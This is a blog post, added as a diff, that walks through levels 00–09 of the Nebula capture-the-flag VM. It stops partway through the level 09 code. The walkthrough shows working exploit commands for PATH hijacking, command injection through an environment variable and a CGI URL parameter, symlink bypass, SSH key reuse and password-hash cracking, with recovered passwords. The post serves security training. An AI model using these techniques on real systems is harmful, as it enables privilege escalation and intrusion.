@@ -1,0 +1,762 @@
+<!doctype html>
+<html class="no-js">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Unlogic</title>
+        <meta name="author">
+        <meta name="description" content="I have a keyboard, a compiler, and a whole load of luck">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="generator" content="Hugo 0.15" />
+          <link href="http://unlogic.co.ukpost/index.xml" rel="alternate" type="application/rss+xml" title="Unlogic" />
+          <link href="http://unlogic.co.ukpost/index.xml" rel="feed" type="application/rss+xml" title="Unlogic" />
+        <link href='//fonts.googleapis.com/css?family=Roboto:400,300,700|Noto+Serif:400,400italic,700,700italic' rel='stylesheet' type='text/css'>
+        <link rel="stylesheet" href="http://unlogic.co.ukcss/styles.css">
+        <link rel="icon" href="http://unlogic.co.ukfavicon.ico">
+        <link rel="apple-touch-icon" href="http://unlogic.co.ukapple-touch-icon.png" />
+        <link rel="stylesheet" href="http://unlogic.co.ukcss/highlightjs/monokai.css">
+        <script src="http://unlogic.co.ukjs/vendor/modernizr-2.8.0.min.js"></script>
+        <style>
+        .site-header h2 .logo {
+        background: url(http://unlogic.co.ukimages/keyboard-feature.jpg) no-repeat 0 0;
+        }
+        @media (min--moz-device-pixel-ratio: 1.3), (-o-min-device-pixel-ratio: 2.6 / 2), (-webkit-min-device-pixel-ratio: 1.3), (min-device-pixel-ratio: 1.3), (min-resolution: 1.3dppx) {
+          .site-header h2 .logo {
+            background-image: url(http://unlogic.co.ukimages/keyboard-feature.jpg);
+        }}
+       .site-header {
+         background: #2a373d url(http://unlogic.co.ukimages/keyboard-feature.jpg) no-repeat center center;
+         z-index: -1;
+         color: #BBB;
+         height: 170px;
+        }
+        </style>
+    </head>
+    <body>
+        
+        <header class="site-header">
+          <div class="transparent-layer">
+              <h2><a style="color: #EEE" href="http://unlogic.co.uk">Unlogic</a></h2>
+          </div>
+        </header>
+
+
+<div class="container clearfix">
+    <main role="main" class="content">
+        <article class="post">
+            <a class="btn" href="http://unlogic.co.uk" title="">&laquo; </a>
+            
+<h1><a href="http://unlogic.co.uk/2014/06/24/cracking-nebula-part1/" title="Cracking Nebula Part 1">Cracking Nebula Part 1</a></h1>
+
+<footer class="post-info"> <span class="post-meta"><time datetime="2014.06.24">2014.06.24</time>
+&middot; 
+    
+    <a href="http://unlogic.co.uktags/ctf">ctf</a>, 
+    
+    <a href="http://unlogic.co.uktags/hacking">hacking</a>, 
+    
+    <a href="http://unlogic.co.uktags/exploits">exploits</a>
+    
+
+</span>
+</footer>
+
+            
+            <div id="toc" class="toc">
+            <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#level-00:30500b9ac805cc116818bc6edd5ba7d1">Level 00</a></li>
+<li><a href="#level-01:30500b9ac805cc116818bc6edd5ba7d1">Level 01</a></li>
+<li><a href="#level-02:30500b9ac805cc116818bc6edd5ba7d1">Level 02</a></li>
+<li><a href="#level-03:30500b9ac805cc116818bc6edd5ba7d1">Level 03</a></li>
+<li><a href="#level-04:30500b9ac805cc116818bc6edd5ba7d1">Level 04</a></li>
+<li><a href="#level-05:30500b9ac805cc116818bc6edd5ba7d1">Level 05</a></li>
+<li><a href="#level-06:30500b9ac805cc116818bc6edd5ba7d1">Level 06</a></li>
+<li><a href="#level-07:30500b9ac805cc116818bc6edd5ba7d1">Level 07</a></li>
+<li><a href="#level-08:30500b9ac805cc116818bc6edd5ba7d1">Level 08</a></li>
+<li><a href="#level-09:30500b9ac805cc116818bc6edd5ba7d1">Level 09</a></li>
+<li><a href="#level-10:30500b9ac805cc116818bc6edd5ba7d1">Level 10</a></li>
+</ul></li>
+</ul>
+</nav>
+            </div>
+            
+            
+
+<p>On <a href="http://www.exploit-exercises.com/">Exploit Exercises</a> you can find a
+number of CTF (Capture The Flag) VM images where you can practice your
+exploiting, hacking and general computer savviness. I&rsquo;ve been working
+my way through the Nebula machine and figured I might as well write
+up the process both for other&rsquo;s benefit if they get stuck, and also as
+a sort of diary for myself, so I can refer back to any info if I need to.</p>
+
+<p>The Nebula VM can be downloaded from the <a href="http://www.exploit-exercises.com/download">Exploit Exercises download page</a></p>
+
+<p>To quickly explain what you need to do: Login in as user <code>levelxx</code> and then run <code>getflag</code> as user <code>flagxx</code>.
+There&rsquo;s some explanations for each level on the machine&rsquo;s page over at Exploit Exercises.</p>
+
+<h2 id="level-00:30500b9ac805cc116818bc6edd5ba7d1">Level 00</h2>
+
+<blockquote>
+<p>This level requires you to find a Set User ID program that will run as the &ldquo;flag00&rdquo; account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p>
+
+<p>Alternatively, look at the find man page.</p>
+</blockquote>
+
+<p>So somewhere from the root directory is a file will run as the flag00 user. As stated you can either look for it, or
+use <code>find</code> to search for it. I chose to do a little bit of both. Running <code>find</code> from the root of a system can take some time so I chose to take a look first. Amongst the usual directories at linux root level is a <code>rofs</code> directory. So let&rsquo;s take a look inside.</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%">flag00@nebula:/rofs$ ls
+bin   dev  home        lib    mnt  proc  run   selinux  sys  usr  vmlinuz
+boot  etc  initrd.img  media  opt  root  sbin  srv      tmp  var
+</pre></div>
+
+
+<p>Looks the same, but let&rsquo;s run a find in here.</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level00@nebula:/rofs$ find -user flag00 -print 2&gt; /dev/null
+./bin/.../flag00
+./home/flag00
+./home/flag00/.bash_logout
+./home/flag00/.bashrc
+./home/flag00/.profile
+</pre></div>
+
+
+<p>There&rsquo;s the usual stuff, but there&rsquo;s also <code>./bin/.../flag00</code>. If you run this you can get the flag:</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level00@nebula:/rofs$ ./bin/.../flag00
+Congrats, now run getflag to get your flag!
+flag00@nebula:/rofs$ getflag
+You have successfully executed getflag on a target account
+</pre></div>
+
+
+<h2 id="level-01:30500b9ac805cc116818bc6edd5ba7d1">Level 01</h2>
+
+<blockquote>
+<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
+<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
+<span style="color: #75715e">#include &lt;string.h&gt;</span>
+<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
+<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
+
+<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
+<span style="color: #f8f8f2">{</span>
+  <span style="color: #66d9ef">gid_t</span> <span style="color: #f8f8f2">gid;</span>
+  <span style="color: #66d9ef">uid_t</span> <span style="color: #f8f8f2">uid;</span>
+  <span style="color: #f8f8f2">gid</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getegid();</span>
+  <span style="color: #f8f8f2">uid</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">geteuid();</span>
+
+  <span style="color: #f8f8f2">setresgid(gid,</span> <span style="color: #f8f8f2">gid,</span> <span style="color: #f8f8f2">gid);</span>
+  <span style="color: #f8f8f2">setresuid(uid,</span> <span style="color: #f8f8f2">uid,</span> <span style="color: #f8f8f2">uid);</span>
+
+  <span style="color: #f8f8f2">system(</span><span style="color: #e6db74">&quot;/usr/bin/env echo and now what?&quot;</span><span style="color: #f8f8f2">);</span>
+<span style="color: #f8f8f2">}</span>
+</pre></div>
+</p>
+</blockquote>
+
+<p>So let&rsquo;s see about this vulnerability. It doesn&rsquo;t accept user input, but luckily there&rsquo;s only one place where it actually runs anything, so that makes it easier to narrow down where its weakness is. The <code>system</code> call executes an <code>echo</code> but there&rsquo;s a small oversight. It calls <code>echo</code> without an explicit path, can you see where this is going? As <code>flag01</code> runs as user <code>flag01</code>, anything it executes will also run under that user.</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level01@nebula:/home/flag01$ mkdir /tmp/mybin
+level01@nebula:/home/flag01$ <span style="color: #f8f8f2">cd</span> /tmp/mybin
+level01@nebula:/tmp/mybin$ which getflag
+/bin/getflag
+level01@nebula:/tmp/mybin$ cp /bin/getflag <span style="color: #f8f8f2">echo</span>
+level01@nebula:/tmp/mybin$<span style="color: #f8f8f2"> cd</span> ~flag01
+level01@nebula:/home/flag01$ <span style="color: #f8f8f2">export PATH</span><span style="color: #f92672">=</span>/tmp/mybin:<span style="color: #e6db74">${</span><span style="color: #f8f8f2">PATH</span><span style="color: #e6db74">}</span>
+level01@nebula:/home/flag01$ ./flag01
+You have successfully executed getflag on a target account
+</pre></div>
+
+
+<h2 id="level-02:30500b9ac805cc116818bc6edd5ba7d1">Level 02</h2>
+
+<blockquote>
+<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>
+</blockquote>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
+<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
+<span style="color: #75715e">#include &lt;string.h&gt;</span>
+<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
+<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
+
+<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
+<span style="color: #f8f8f2">{</span>
+  <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">buffer;</span>
+
+  <span style="color: #66d9ef">gid_t</span> <span style="color: #f8f8f2">gid;</span>
+  <span style="color: #66d9ef">uid_t</span> <span style="color: #f8f8f2">uid;</span>
+
+  <span style="color: #f8f8f2">gid</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getegid();</span>
+  <span style="color: #f8f8f2">uid</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">geteuid();</span>
+
+  <span style="color: #f8f8f2">setresgid(gid,</span> <span style="color: #f8f8f2">gid,</span> <span style="color: #f8f8f2">gid);</span>
+  <span style="color: #f8f8f2">setresuid(uid,</span> <span style="color: #f8f8f2">uid,</span> <span style="color: #f8f8f2">uid);</span>
+
+  <span style="color: #f8f8f2">buffer</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">NULL;</span>
+
+ <span style="color: #f8f8f2">asprintf(</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">buffer,</span> <span style="color: #e6db74">&quot;/bin/echo %s is cool&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">getenv(</span><span style="color: #e6db74">&quot;USER&quot;</span><span style="color: #f8f8f2">));</span>
+  <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;about to call system(</span><span style="color: #ae81ff">\&quot;</span><span style="color: #e6db74">%s</span><span style="color: #ae81ff">\&quot;</span><span style="color: #e6db74">)</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">buffer);</span>
+  
+  <span style="color: #f8f8f2">system(buffer);</span>
+<span style="color: #f8f8f2">}</span>
+</pre></div>
+
+
+<p>This is very similar to <em>Level01</em> but this time they seem to have patched the system call. However this time they&rsquo;ve added something to the statement that we have control over. Look at line 22 and think about how we can make use of that.</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level02@nebula:/home/flag02$ <span style="color: #f8f8f2">export USER</span><span style="color: #f92672">=</span><span style="color: #e6db74">&#39;&quot;&quot;;getflag&#39;</span>
+level02@nebula:/home/flag02$ ./flag02
+about to call system(&quot;/bin/echo &quot;&quot;;getflag is cool&quot;)
+
+You have successfully executed getflag on a target account
+</pre></div>
+
+
+<h2 id="level-03:30500b9ac805cc116818bc6edd5ba7d1">Level 03</h2>
+
+<blockquote>
+<p>Check the home directory of flag03 and take note of the files there.</p>
+
+<p>There is a crontab that is called every couple of minutes.</p>
+</blockquote>
+
+<p>So first things first let&rsquo;s take a look at that crontab</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level03@nebula:/home/flag03$ cat writable.sh
+#!/bin/sh
+
+for i in /home/flag03/writable.d/* ; do
+	(ulimit -t 5; bash -x &quot;$i&quot;)
+	rm -f &quot;$i&quot;
+done
+</pre></div>
+
+
+<p>Ok, so it will take a shell script in the <code>writeable.d</code> directory, execute it and then delete it. Luckily the directory is world read/write, allowing us to add out own script. As the crontab will run the script as the <code>flag03</code> user, we might as well just run the <code>getflag</code> from it. We&rsquo;ll capture some output to make sure it worked.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level03@nebula:/home/flag03$ cat writeable.d/getit
+/bin/getflag &gt; /tmp/gotit
+# <span style="color: #f8f8f2">wait </span><span style="color: #66d9ef">for</span> the script to run....
+level03@nebula:/home/flag03$ cat /tmp/gotflag
+You have successfully executed getflag on a target account
+</pre></div>
+</p>
+
+<h2 id="level-04:30500b9ac805cc116818bc6edd5ba7d1">Level 04</h2>
+
+<blockquote>
+<p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
+<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
+<span style="color: #75715e">#include &lt;string.h&gt;</span>
+<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
+<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
+<span style="color: #75715e">#include &lt;fcntl.h&gt;</span>
+
+<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">envp)</span>
+<span style="color: #f8f8f2">{</span>
+  <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buf[</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">];</span>
+  <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">fd,</span> <span style="color: #f8f8f2">rc;</span>
+
+  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s [file to read]</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span>
+    <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
+  <span style="color: #f8f8f2">}</span>
+
+  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(strstr(argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">],</span> <span style="color: #e6db74">&quot;token&quot;</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">NULL)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;You may not access &#39;%s&#39;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
+    <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
+  <span style="color: #f8f8f2">}</span>
+
+  <span style="color: #f8f8f2">fd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">open(argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">],</span> <span style="color: #f8f8f2">O_RDONLY);</span>
+  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(fd</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #f8f8f2">err(EXIT_FAILURE,</span> <span style="color: #e6db74">&quot;Unable to open %s&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
+  <span style="color: #f8f8f2">}</span>
+
+  <span style="color: #f8f8f2">rc</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">read(fd,</span> <span style="color: #f8f8f2">buf,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buf));</span>
+  
+  <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(rc</span> <span style="color: #f92672">==</span> <span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
+    <span style="color: #f8f8f2">err(EXIT_FAILURE,</span> <span style="color: #e6db74">&quot;Unable to read fd %d&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">fd);</span>
+  <span style="color: #f8f8f2">}</span>
+
+  <span style="color: #f8f8f2">write(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">buf,</span> <span style="color: #f8f8f2">rc);</span>
+<span style="color: #f8f8f2">}</span>
+</pre></div>
+</p>
+</blockquote>
+
+<p>Ok, so let&rsquo;s take a look at what happens when we run the file
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level04@nebula:/home/flag04$ ls
+flag04  token
+level04@nebula:/home/flag04$ ./flag04
+./flag04 [file to read]
+level04@nebula:/home/flag04$ ./flag04 token
+You may not access &#39;token&#39;
+</pre></div>
+</p>
+
+<p>So we can&rsquo;t access token. Looking at the code there&rsquo;s a check to see if the file is named <code>token</code>. We can&rsquo;t simply copy the <em>token</em> file because it&rsquo;s read only by the flag user. So there&rsquo;s only one thing for it: symlinks</p>
+
+<p>Then get the flag (some ssh output cut for brevity)
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/myfile
+level04@nebula:/home/flag04$ ./flag04 /tmp/myfile
+06508b5e-8909-4f38-b630-fdb148a848a2
+level04@nebula:/home/flag04$ ssh flag04@localhost
+
+flag04@localhost&#39;s password:
+
+flag04@nebula:~$ getflag
+You have successfully executed getflag on a target account
+</pre></div>
+</p>
+
+<p>So the output of the command is a <em>token</em> which is the term used for the password of the flag&rsquo;s user. Using this to logon as <em>flag04</em> and run <code>getflag</code>.</p>
+
+<h2 id="level-05:30500b9ac805cc116818bc6edd5ba7d1">Level 05</h2>
+
+<blockquote>
+<p>Check the flag05 home directory. You are looking for weak directory permissions</p>
+</blockquote>
+
+<p>Ok, let&rsquo;s do that
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%">level05@nebula:~$ <span style="color: #f8f8f2">cd</span> ~flag05
+level05@nebula:/home/flag05$ ls -la
+total 5
+drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
+drwxr-xr-x 1 root   root     420 2012-08-27 07:18 ..
+drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
+-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
+-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
+drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
+</pre></div>
+</p>
+
+<p>That <em>backup</em> directory looks like our target</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level05@nebula:/home/flag05$ <span style="color: #f8f8f2">cd</span> .backup/
+level05@nebula:/home/flag05/.backup$ ls -la
+total 2
+drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
+drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
+-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
+level05@nebula:/home/flag05/.backup$ tar xvzf backup-19072011.tgz -C /tmp
+.ssh/
+.ssh/id_rsa.pub
+.ssh/id_rsa
+.ssh/authorized_keys
+</pre></div>
+</p>
+
+<p>Right so let&rsquo;s use these keys to login as <em>flag05</em>.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level05@nebula:/home/flag05/.backup$ ssh -i /tmp/.ssh/id_rsa flag05@localhost
+
+flag05@nebula:~$ getflag
+You have successfully executed getflag on a target account
+</pre></div>
+</p>
+
+<h2 id="level-06:30500b9ac805cc116818bc6edd5ba7d1">Level 06</h2>
+
+<blockquote>
+<p>The flag06 account credentials came from a legacy unix system.</p>
+</blockquote>
+
+<p>To cut a long story short, the way the password is stored for this user is not the same as for the other users. In older *nix systems the password was stored inside the <code>/etc/passwd</code> file. So let&rsquo;s take a look:</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level06@nebula:/home/flag06$ cat /etc/passwd <span style="color: #f8f8f2">|</span> grep flag06
+flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
+</pre></div>
+</p>
+
+<p>Yep, there&rsquo;s the encrypted password. Grab that line and run it through John The Ripper</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# <span style="color: #f8f8f2">echo </span>flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh &gt; nebula.txt
+root@kali:~# john nebula.txt  -show
+flag06:hello:993:993::/home/flag06:/bin/sh
+
+1 password hash cracked, 0 left
+</pre></div>
+</p>
+
+<p>That&rsquo;s that, now back on the nebula box</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level06@nebula:/home/flag06$ ssh flag06@localhost
+
+flag06@localhost&#39;s password: hello
+
+getflag06@nebula:~$ getflag
+You have successfully executed getflag on a target account
+</pre></div>
+</p>
+
+<h2 id="level-07:30500b9ac805cc116818bc6edd5ba7d1">Level 07</h2>
+
+<blockquote>
+<p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>
+</blockquote>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#!/usr/bin/perl</span>
+
+<span style="color: #66d9ef">use</span> <span style="color: #f8f8f2">CGI</span> <span style="color: #e6db74">qw{param}</span><span style="color: #f8f8f2">;</span>
+
+<span style="color: #66d9ef">print</span> <span style="color: #e6db74">&quot;Content-type: text/html\n\n&quot;</span><span style="color: #f8f8f2">;</span>
+
+<span style="color: #66d9ef">sub </span><span style="color: #a6e22e">ping</span> <span style="color: #f8f8f2">{</span>
+  <span style="color: #f8f8f2">$host</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">$_[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">];</span>
+
+  <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;</span><span style="color: #f8f8f2">);</span>
+
+  <span style="color: #f8f8f2">@output</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">`ping -c 3 $host 2&gt;&amp;1`</span><span style="color: #f8f8f2">;</span>
+  <span style="color: #66d9ef">foreach</span> <span style="color: #f8f8f2">$line</span> <span style="color: #f8f8f2">(@output)</span> <span style="color: #f8f8f2">{</span> <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&quot;$line&quot;</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">}</span> 
+
+  <span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><span style="color: #f8f8f2">);</span>
+  
+<span style="color: #f8f8f2">}</span>
+
+<span style="color: #75715e"># check if Host set. if not, display normal page, etc</span>
+
+<span style="color: #f8f8f2">ping(param(</span><span style="color: #e6db74">&quot;Host&quot;</span><span style="color: #f8f8f2">));</span>
+</pre></div>
+</p>
+
+<p>So the Nebula machine has a webserver running. Checking the config file we can see that it&rsquo;s running on port 7007. The script tells us that it&rsquo;s expecting a <code>Host</code> parameter. So let&rsquo;s hit the server from our web browser at the following URL (your IP will depend on what IP your VM has) <code>http://192.168.56.102:7007/index.cgi?Host=192.168.56.102</code></p>
+
+<p>Basically I am pinging the same host. The webpage will display the output of the ping command.</p>
+
+<p>We can&rsquo;t change the ping call, but we have control over what gets passed to the command. Let&rsquo;s craft a special URL</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">$&gt; curl http://192.168.56.102:7007/index.cgi?Host<span style="color: #f92672">=</span>127.0.0.1%20%26%26%20getflag
+&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.117 ms
+64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.028 ms
+64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.035 ms
+
+--- 127.0.0.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1998ms
+rtt min/avg/max/mdev = 0.028/0.060/0.117/0.040 ms
+You have successfully executed getflag on a target account
+</pre></div>
+</p>
+
+<p>Notice we need to encode the URL parms. The plaintext URL is <code>http://192.168.56.102:7007/index.cgi?Host=127.0.0.1 &amp;&amp; getflag</code></p>
+
+<h2 id="level-08:30500b9ac805cc116818bc6edd5ba7d1">Level 08</h2>
+
+<blockquote>
+<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>
+</blockquote>
+
+<p>Let&rsquo;s take a look then</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level08@nebula:/home/flag08$ ls -la
+total 18
+drwxr-x--- 1 flag08 level08   60 2014-06-14 14:10 .
+drwxr-xr-x 1 root   root     500 2012-08-27 07:18 ..
+-rw------- 1 flag08 flag08    13 2014-06-14 14:10 .bash_history
+-rw-r--r-- 1 flag08 flag08   220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 flag08 flag08  3353 2011-05-18 02:54 .bashrc
+-rw-r--r-- 1 root   root    8302 2011-11-20 21:22 capture.pcap
+-rw-r--r-- 1 flag08 flag08   675 2011-05-18 02:54 .profile
+</pre></div>
+</p>
+
+<p>The only interesting file that&rsquo;s readable here is <code>capture.pcap</code>. Let&rsquo;s copy it out and use <em>Wireshark</em> to take a look at it.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">$&gt; scp level08@192.168.56.102:/home/flag08/capture.pcap .
+
+level08@192.168.56.102&#39;s password:
+capture.pcap                                  100% 8302     8.1KB/s   00:00
+</pre></div>
+</p>
+
+<p>Once in Wireshark we can see a TCP stream. Right click on one of the entries and select <code>Follow TCP Stream</code>. A new window will appear in which we can see a login attempt. Red entries are user input, and blue entries are the server responses. The username is <code>level08</code>. The password is&hellip; well, take a look. Notice the <code>7f</code> entries. Those are deletes.</p>
+
+<p><a href="http://i.imgur.com/IEseNUh.png">
+<figure >
+    
+        <img src="http://i.imgur.com/IEseNUh.png" />
+    
+    
+</figure>
+</a></p>
+
+<p>So&hellip;.</p>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level08@nebula:/home/flag08$ ssh flag08@localhost
+
+flag08@localhost&#39;s password: backd00Rmate
+
+flag08@nebula:~$ getflag
+You have successfully executed getflag on a target account
+</pre></div>
+</p>
+
+<h2 id="level-09:30500b9ac805cc116818bc6edd5ba7d1">Level 09</h2>
+
+<blockquote>
+<p>There&rsquo;s a C setuid wrapper for some vulnerable PHP code&hellip;</p>
+</blockquote>
+
+<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">&lt;?php</span>
+
+<span style="color: #66d9ef">function</span> <span style="color: #a6e22e">spam</span><span style="color: #f8f8f2">($email)</span>
+<span style="color: #f8f8f2">{</span>
+  <span style="color: #f8f8f2">$email</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">preg_replace(</span><span style="color: #e6db74">&quot;/\./&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot; dot &quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$email);</span>
+  <span style="color: #f8f8f2">$email</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">preg_replace(</span><span style="color: #e6db74">&quot;/@/&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&quot; AT &quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">$email);</span>
+  
+  <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">$email;</span>
+<span style="color: #f8f8f2">}</span>
+
+<span style="color: #66d9ef">function</span> <span style="color: #a6e22e">markup</span><span style="color: #f8f8f2">($filename,</span> <span style="color: #f8f8f2">$use_me)</span>
+<span style="color: #f8f8f2">{</span>
